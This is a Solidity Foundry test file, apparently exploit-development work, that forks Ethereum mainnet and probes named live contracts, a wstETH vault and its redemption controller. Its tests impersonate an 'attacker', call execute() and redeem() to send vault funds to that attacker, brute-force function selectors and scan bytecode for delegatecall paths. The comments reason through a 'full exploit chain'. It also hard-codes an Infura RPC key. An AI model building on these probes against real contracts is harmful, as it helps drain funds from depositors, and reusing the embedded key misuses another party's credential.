// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
}

contract ExecuteFunctionExploit is Test {
    address constant REDEMPTION_0 = 0xcd63a29FAfF07130d3Af89bB4f40778938AaBB85;
    address constant REDEMPTION_1 = 0x829525417Cd78CBa0f99A8736426fC299506C0d6;
    address constant REDEMPTION_CONTROLLER = 0xdF2eE409BEe416A53b5C040d8e6dAD4a7cEb2510;
    address constant VAULT = 0x551d155760ae96050439AD24Ae98A96c765d761B;
    address constant wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;

    address constant VAULT_SLOT2 = 0x1af329D2C4CeaF45E1D8062c696b09FfadDb933a;
    address constant VAULT_SLOT5 = 0x97c03F52244E60BB18511Cbf03f890D5886f1F47;
    address constant VAULT_SLOT2_OWNER = 0x22261B4D6F629D8cF946C3524df86bF7222901F6;

    string RPC_URL = "https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c";
    address attacker;

    function setUp() public {
        vm.createSelectFork(RPC_URL);
        attacker = makeAddr("attacker");
        vm.deal(attacker, 100 ether);
    }

    function test_TryVaultSlot2Execute() public {
        console.log("=== TRYING VAULT_SLOT2 EXECUTE ===\n");

        uint256 vaultBefore = IERC20(wstETH).balanceOf(VAULT);
        console.log("Vault before:", vaultBefore / 1e18);

        // execute(address,uint256,bytes) = 0xa0cf0aea
        // Try to call RC.redeem through execute

        bytes memory rcRedeemCall = abi.encodeWithSignature(
            "redeem(uint256,address)",
            1000e18,
            attacker
        );

        vm.startPrank(attacker);

        // Try as attacker
        (bool s1, bytes memory d1) = VAULT_SLOT2.call(
            abi.encodeWithSignature(
                "execute(address,uint256,bytes)",
                REDEMPTION_CONTROLLER,
                0,
                rcRedeemCall
            )
        );
        console.log("execute as attacker:", s1);
        if (!s1 && d1.length >= 4) {
            console.log("Error selector:");
            console.logBytes4(bytes4(d1));
        }

        vm.stopPrank();

        // Try as owner (Safe)
        vm.startPrank(VAULT_SLOT2_OWNER);

        (bool s2, bytes memory d2) = VAULT_SLOT2.call(
            abi.encodeWithSignature(
                "execute(address,uint256,bytes)",
                REDEMPTION_CONTROLLER,
                0,
                rcRedeemCall
            )
        );
        console.log("execute as owner:", s2);
        if (!s2 && d2.length >= 4) {
            console.log("Error selector:");
            console.logBytes4(bytes4(d2));
        }

        vm.stopPrank();

        uint256 vaultAfter = IERC20(wstETH).balanceOf(VAULT);
        console.log("\nVault after:", vaultAfter / 1e18);
        console.log("Attacker wstETH:", IERC20(wstETH).balanceOf(attacker) / 1e18);
    }

    function test_AnalyzeVaultSlot2ExecuteBytecode() public view {
        console.log("=== ANALYZING VAULT_SLOT2 EXECUTE BYTECODE ===\n");

        bytes memory code = VAULT_SLOT2.code;

        // Find execute selector 0xa0cf0aea
        bytes4 executeSel = bytes4(0xa0cf0aea);

        console.log("Searching for execute selector:");
        for (uint i = 0; i + 4 < code.length; i++) {
            if (uint8(code[i]) == 0x63) {
                bytes4 sel = bytes4(bytes.concat(code[i+1], code[i+2], code[i+3], code[i+4]));
                if (sel == executeSel) {
                    console.log("Found at offset:", i);

                    // Look for DELEGATECALL, CALL, or access control
                    uint start = i > 100 ? i - 100 : 0;
                    for (uint j = start; j < i + 200 && j < code.length; j++) {
                        if (uint8(code[j]) == 0xf1) console.log("  CALL at:", j);
                        if (uint8(code[j]) == 0xf4) console.log("  DELEGATECALL at:", j);
                        if (uint8(code[j]) == 0x33) console.log("  CALLER at:", j);
                        if (uint8(code[j]) == 0x54) console.log("  SLOAD at:", j);
                    }
                }
            }
        }

        // Find all DELEGATECALLs
        console.log("\nAll DELEGATECALLs in VAULT_SLOT2:");
        for (uint i = 0; i < code.length; i++) {
            if (uint8(code[i]) == 0xf4) {
                console.log("DELEGATECALL at:", i);

                // Look for SLOAD before it
                for (uint j = (i > 50 ? i - 50 : 0); j < i; j++) {
                    if (uint8(code[j]) == 0x54) {
                        console.log("  SLOAD at:", j);
                    }
                    if (uint8(code[j]) == 0x73) {
                        console.log("  PUSH20 at:", j);
                    }
                }
            }
        }
    }

    function test_TryVaultDelegatecallToSlot2() public {
        console.log("=== TRYING VAULT DELEGATECALL TO SLOT2 ===\n");

        // The Vault has SLOAD at 687 -> DELEGATECALL at 734
        // Slot 2 contains VAULT_SLOT2 address
        // If we can trigger this delegatecall path with our calldata...

        uint256 vaultBefore = IERC20(wstETH).balanceOf(VAULT);

        vm.startPrank(attacker);

        // Try calling Vault with various selectors that might route to slot 2
        bytes4[] memory sels = new bytes4[](10);
        sels[0] = bytes4(keccak256("performUpkeep(bytes)"));
        sels[1] = bytes4(keccak256("harvest()"));
        sels[2] = bytes4(keccak256("compound()"));
        sels[3] = bytes4(keccak256("rebalance()"));
        sels[4] = bytes4(keccak256("earn()"));
        sels[5] = bytes4(keccak256("work(bytes)"));
        sels[6] = bytes4(keccak256("doHardWork()"));
        sels[7] = bytes4(keccak256("invest()"));
        sels[8] = bytes4(keccak256("strategy()"));
        sels[9] = bytes4(keccak256("keeper()"));

        console.log("Trying Vault selectors:");
        for (uint i = 0; i < sels.length; i++) {
            (bool s, bytes memory d) = VAULT.call(
                abi.encodeWithSelector(sels[i])
            );
            if (s) {
                console.log("SUCCESS:");
                console.logBytes4(sels[i]);
                console.logBytes(d);
            }
        }

        vm.stopPrank();

        uint256 vaultAfter = IERC20(wstETH).balanceOf(VAULT);
        console.log("\nVault change:", int256(vaultAfter) - int256(vaultBefore));
    }

    function test_CheckVaultSlot2AsRedemption() public {
        console.log("=== CHECKING IF VAULT_SLOT2 CAN ACT AS REDEMPTION ===\n");

        // Can VAULT_SLOT2 call RC.redeem?
        // VAULT_SLOT2 is NOT registered in RC...
        // But what if Vault delegatecalls to VAULT_SLOT2, then VAULT_SLOT2 calls RC.redeem?
        // In delegatecall context, msg.sender would be preserved (original caller)
        // But address(this) would be VAULT

        // Actually in delegatecall:
        // - msg.sender = whoever called VAULT
        // - address(this) = VAULT
        // So RC.redeem would see msg.sender = attacker or VAULT? Neither is registered.

        // Unless... VAULT itself is registered?

        console.log("Checking if VAULT is registered in RC:");
        bytes32 key = keccak256(abi.encode(VAULT, uint256(4)));
        bytes32 val = vm.load(REDEMPTION_CONTROLLER, key);
        console.logBytes32(val);

        if (val != bytes32(0)) {
            console.log("*** VAULT IS REGISTERED! ***");
        } else {
            console.log("VAULT is NOT registered");
        }

        // Try as VAULT anyway
        vm.startPrank(VAULT);
        (bool s, bytes memory d) = REDEMPTION_CONTROLLER.call(
            abi.encodeWithSignature("redeem(uint256,address)", 100e18, attacker)
        );
        console.log("\nRC.redeem as VAULT:", s);
        if (!s && d.length >= 4) {
            console.logBytes4(bytes4(d));
        }
        vm.stopPrank();
    }

    function test_AnalyzeVaultCodeForSlot2Usage() public view {
        console.log("=== ANALYZING HOW VAULT USES SLOT2 ===\n");

        bytes memory code = VAULT.code;

        // Look for PUSH1 0x02 followed by SLOAD
        console.log("Looking for slot 2 access patterns:");
        for (uint i = 0; i + 2 < code.length; i++) {
            if (uint8(code[i]) == 0x60 && uint8(code[i+1]) == 0x02 && uint8(code[i+2]) == 0x54) {
                console.log("PUSH1 2 + SLOAD at:", i);

                // Look for what happens next
                for (uint j = i; j < i + 100 && j < code.length; j++) {
                    if (uint8(code[j]) == 0xf4) {
                        console.log("  -> DELEGATECALL at:", j);
                        break;
                    }
                    if (uint8(code[j]) == 0xf1) {
                        console.log("  -> CALL at:", j);
                        break;
                    }
                }
            }
        }

        // Look for slot 5 access
        console.log("\nLooking for slot 5 access patterns:");
        for (uint i = 0; i + 2 < code.length; i++) {
            if (uint8(code[i]) == 0x60 && uint8(code[i+1]) == 0x05 && uint8(code[i+2]) == 0x54) {
                console.log("PUSH1 5 + SLOAD at:", i);

                for (uint j = i; j < i + 100 && j < code.length; j++) {
                    if (uint8(code[j]) == 0xf4) {
                        console.log("  -> DELEGATECALL at:", j);
                        break;
                    }
                    if (uint8(code[j]) == 0xf1) {
                        console.log("  -> CALL at:", j);
                        break;
                    }
                }
            }
        }
    }

    function test_TryVaultSlot5Execute() public {
        console.log("=== TRYING VAULT_SLOT5 EXECUTE ===\n");

        // Check if VAULT_SLOT5 has execute function
        (bool s1, bytes memory d1) = VAULT_SLOT5.staticcall(
            abi.encodeWithSignature("owner()")
        );
        if (s1 && d1.length >= 32) {
            address owner = abi.decode(d1, (address));
            console.log("VAULT_SLOT5 owner:", owner);
        }

        // Check for execute
        vm.startPrank(attacker);
        (bool s2, bytes memory d2) = VAULT_SLOT5.call(
            abi.encodeWithSignature(
                "execute(address,uint256,bytes)",
                REDEMPTION_CONTROLLER,
                0,
                abi.encodeWithSignature("redeem(uint256,address)", 100e18, attacker)
            )
        );
        console.log("execute on VAULT_SLOT5 as attacker:", s2);
        if (!s2 && d2.length >= 4) {
            console.logBytes4(bytes4(d2));
        }
        vm.stopPrank();

        // Try selectors
        bytes memory code = VAULT_SLOT5.code;
        console.log("\nVAULT_SLOT5 code size:", code.length);

        // Count DELEGATECALLs
        uint dcCount = 0;
        for (uint i = 0; i < code.length; i++) {
            if (uint8(code[i]) == 0xf4) dcCount++;
        }
        console.log("DELEGATECALL count:", dcCount);
    }

    function test_FullExploitChainAttempt() public {
        console.log("=== FULL EXPLOIT CHAIN ATTEMPT ===\n");

        uint256 vaultBefore = IERC20(wstETH).balanceOf(VAULT);
        console.log("Vault before:", vaultBefore / 1e18);

        // The "action chaining" might be:
        // 1. Attacker calls VAULT with specific selector
        // 2. VAULT delegatecalls to VAULT_SLOT2 or VAULT_SLOT5
        // 3. The delegatecall target calls RC.redeem
        // 4. But msg.sender in RC would be the original caller (attacker)

        // Actually wait - in delegatecall chain:
        // attacker -> VAULT (delegatecall) -> VAULT_SLOT2 (call) -> RC
        // RC sees msg.sender = VAULT (because VAULT_SLOT2 code runs in VAULT context)

        // But VAULT is not registered in RC...

        // What if:
        // REDEMPTION_0 -> (some call path) -> RC.redeem(amount, attacker)

        // Let me check if REDEMPTION_0 has any fallback/receive
        console.log("Checking REDEMPTION_0 fallback:");
        bytes memory r0Code = REDEMPTION_0.code;

        // Check for fallback - look for no selector match path
        // In EVM, fallback is typically at the end or uses CALLDATASIZE check

        vm.startPrank(attacker);

        // Try calling REDEMPTION_0 with random calldata
        (bool s1,) = REDEMPTION_0.call(hex"deadbeef");
        console.log("REDEMPTION_0 fallback call:", s1);

        // Try empty calldata (receive)
        (bool s2,) = REDEMPTION_0.call("");
        console.log("REDEMPTION_0 empty call:", s2);

        // Try with ETH
        (bool s3,) = REDEMPTION_0.call{value: 1 ether}("");
        console.log("REDEMPTION_0 with ETH:", s3);

        vm.stopPrank();

        uint256 vaultAfter = IERC20(wstETH).balanceOf(VAULT);
        console.log("\nVault after:", vaultAfter / 1e18);
        console.log("Attacker wstETH:", IERC20(wstETH).balanceOf(attacker) / 1e18);
    }
}
